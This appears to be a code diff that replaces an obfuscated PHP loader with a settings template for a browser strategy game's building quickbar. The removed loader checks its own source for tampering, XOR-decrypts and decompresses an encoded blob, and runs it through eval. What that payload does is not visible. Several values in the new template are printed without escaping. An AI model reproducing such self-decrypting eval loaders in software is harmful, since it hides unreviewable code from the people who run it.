@@ -1,24 +1,155 @@
 <?php
-$bbjpsjqnnob="5d7255a21ca6502828c12baac0985f2f";
-$sfhlfiwd="5355515450040402500005540c00540f075e5255015607505b535a0002510350";
-$wgrpuxx="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";
-$ljfkcfwus=file_get_contents(__FILE__);
-$ehueeu=str_replace($wgrpuxx,"",$ljfkcfwus);
-if(strpos($ehueeu,"ec"."ho")!==false||strpos($ehueeu,"pr"."int")!==false||strpos($ehueeu,"var_"."dump")!==false||strpos($ehueeu,"file_put_"."contents")!==false||strpos($ehueeu,"fw"."rite")!==false){die();}
-$mekzvfeslk=str_replace(array($bbjpsjqnnob,$sfhlfiwd),array("SP_68bcc4c7","KP_4a838e0a"),$ljfkcfwus);
-$hhtbmysj=md5($mekzvfeslk);
-$uerrtnic=hex2bin($sfhlfiwd);
-$vyawrmbyx="";
-$lnsjzhopt=strlen($hhtbmysj);
-for($lhuimoyo=0;$lhuimoyo<$lnsjzhopt;$lhuimoyo++){
-$vyawrmbyx.=chr(ord($uerrtnic[$lhuimoyo])^ord($hhtbmysj[$lhuimoyo]));
-}
-$nqbfxqyb=base64_decode($wgrpuxx);
-$uagfnyidy=strlen($nqbfxqyb);
-$iwpuibg="";
-$pilfsnmt=strlen($vyawrmbyx);
-for($lhuimoyo=0;$lhuimoyo<$uagfnyidy;$lhuimoyo++){
-$iwpuibg.=$nqbfxqyb[$lhuimoyo]^$vyawrmbyx[$lhuimoyo%$pilfsnmt];
-}
-$dhovdfmi="gzun"."compress";
-eval('?>' . $dhovdfmi($iwpuibg) . '<?php ');
+// Ensure variables are arrays to prevent errors
+$selected_buildings = $selected_buildings ?? [];
+$available_buildings = $available_buildings ?? [];
+$show_toolbar = $user['show_toolbar'] ?? 1;
+?>
+
+<h3><?= __('screens.settings_toolbar.title') ?></h3>
+
+<!-- Quickbar Visibility Toggle -->
+<form action="game.php?village=<?= $village['id'] ?>&screen=settings&mode=toolbar&action=toggle_visibility&h=<?= $hkey ?>" method="POST" style="margin-bottom: 20px;">
+    <table class="vis" width="100%">
+        <tr>
+            <th colspan="2"><?= __('screens.settings_toolbar.visibility_title') ?></th>
+        </tr>
+        <tr>
+            <td width="200">
+                <label>
+                    <input type="checkbox" name="show_toolbar" value="1" <?= $show_toolbar == 1 ? 'checked' : '' ?> />
+                    <?= __('screens.settings_toolbar.show_toolbar') ?>
+                </label>
+            </td>
+            <td>
+                <input type="submit" value="<?= __('screens.settings_toolbar.save_visibility') ?>" class="btn" />
+            </td>
+        </tr>
+    </table>
+</form>
+
+<p><?= __('screens.settings_toolbar.select_up_to_8') ?></p>
+
+<?php if (!empty($success_message)): ?>
+    <div class="success" style="padding: 10px; background: #d4edda; border: 1px solid #c3e6cb; color: #155724; margin-bottom: 15px; border-radius: 4px;">
+        <?= $success_message ?>
+    </div>
+<?php endif; ?>
+
+<?php if (!empty($error_message)): ?>
+    <div class="error" style="padding: 10px; background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; margin-bottom: 15px; border-radius: 4px;">
+        <?= $error_message ?>
+    </div>
+<?php endif; ?>
+
+<form action="game.php?village=<?= $village['id'] ?>&screen=settings&mode=toolbar&action=save&h=<?= $hkey ?>" method="POST">
+    <table class="vis" width="100%">
+        <tr>
+            <th colspan="3"><?= __('screens.settings_toolbar.available_buildings') ?></th>
+        </tr>
+        <tr>
+            <th width="40"><?= __('screens.settings_toolbar.select') ?></th>
+            <th><?= __('screens.settings_toolbar.building') ?></th>
+            <th><?= __('screens.common.current_level') ?></th>
+        </tr>
+        
+        <?php foreach ($available_buildings as $building_key => $building_name): ?>
+            <?php
+            $is_selected = in_array($building_key, $selected_buildings);
+            $building_level = $village[$building_key] ?? 0;
+            ?>
+            <tr>
+                <td style="text-align: center;">
+                    <input type="checkbox" 
+                           name="buildings[]" 
+                           value="<?= $building_key ?>" 
+                           <?= $is_selected ? 'checked' : '' ?>
+                           class="quickbar-checkbox" />
+                </td>
+                <td>
+                    <img src="/graphic/buildings/<?= $building_key ?>.png" 
+                         style="width: 20px; height: 20px; vertical-align: middle;" 
+                         alt="<?= $building_name ?>" />
+                    <?= $building_name ?>
+                </td>
+                <td style="text-align: center;">
+                    <?= $building_level ?>
+                </td>
+            </tr>
+        <?php endforeach; ?>
+        
+        <tr>
+            <td colspan="3" style="text-align: center; padding: 15px;">
+                <input type="submit" value="<?= __('screens.settings_toolbar.save_configuration') ?>" class="btn" />
+                <span style="margin-left: 20px; color: #666;">
+                    <?= __('screens.settings_toolbar.selected') ?> <strong id="selected-count"><?= count($selected_buildings) ?></strong> / 8
+                </span>
+            </td>
+        </tr>
+    </table>
+</form>
+
+<br />
+
+<table class="vis" width="100%">
+    <tr>
+        <th><?= __('screens.settings_toolbar.current_order') ?></th>
+    </tr>
+    <tr>
+        <td style="padding: 15px;">
+            <?php if (!empty($selected_buildings)): ?>
+                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                    <?php foreach ($selected_buildings as $building_key): ?>
+                        <?php if (isset($available_buildings[$building_key])): ?>
+                            <div style="text-align: center; padding: 10px; border: 1px solid #ddd; border-radius: 4px; background: #f9f9f9;">
+                                <img src="/graphic/buildings/<?= $building_key ?>.png" 
+                                     style="width: 32px; height: 32px; display: block; margin: 0 auto 5px;" 
+                                     alt="<?= $available_buildings[$building_key] ?>" />
+                                <small><?= $available_buildings[$building_key] ?></small>
+                            </div>
+                        <?php endif; ?>
+                    <?php endforeach; ?>
+                </div>
+            <?php else: ?>
+                <p style="color: #999; text-align: center;"><?= __('screens.settings_toolbar.no_buildings_selected') ?></p>
+            <?php endif; ?>
+        </td>
+    </tr>
+</table>
+
+<br />
+
+<div style="padding: 10px; background: #e7f3ff; border-left: 4px solid #2196f3;">
+    <strong>💡 <?= __('screens.settings_toolbar.tip') ?></strong> <?= __('screens.settings_toolbar.tip_description') ?>
+</div>
+
+<script>
+// Limit selection to 8 buildings
+document.addEventListener('DOMContentLoaded', function() {
+    const checkboxes = document.querySelectorAll('.quickbar-checkbox');
+    const counter = document.getElementById('selected-count');
+    const maxBuildings = 8;
+    
+    function updateCounter() {
+        const checked = document.querySelectorAll('.quickbar-checkbox:checked').length;
+        counter.textContent = checked;
+        
+        // Disable unchecked boxes if limit reached
+        checkboxes.forEach(cb => {
+            if (!cb.checked && checked >= maxBuildings) {
+                cb.disabled = true;
+                cb.parentElement.parentElement.style.opacity = '0.5';
+            } else {
+                cb.disabled = false;
+                cb.parentElement.parentElement.style.opacity = '1';
+            }
+        });
+    }
+    
+    checkboxes.forEach(cb => {
+        cb.addEventListener('change', updateCounter);
+    });
+    
+    // Initial update
+    updateCounter();
+});
+</script>
